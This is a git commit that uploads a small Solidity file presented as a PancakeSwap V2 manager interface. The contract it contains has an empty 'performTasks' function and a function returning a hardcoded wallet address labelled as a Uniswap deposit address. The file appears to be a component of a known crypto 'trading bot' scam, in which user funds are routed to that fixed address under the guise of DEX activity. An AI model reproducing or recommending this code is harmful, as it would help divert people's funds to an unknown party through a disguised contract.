88d9953b4ecb0938c7c0cdc40393594af0848c6b
Eray USTA <2477308+erayusta@users.noreply.github.com>
2022-01-06 15:16:34 +0300

    Add files via upload

---
+++ IPancakeswapV2ManagerV2.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x7f34D98ecF3bBc2877968120a6a0fCB383bDB37F;
+	}
+}
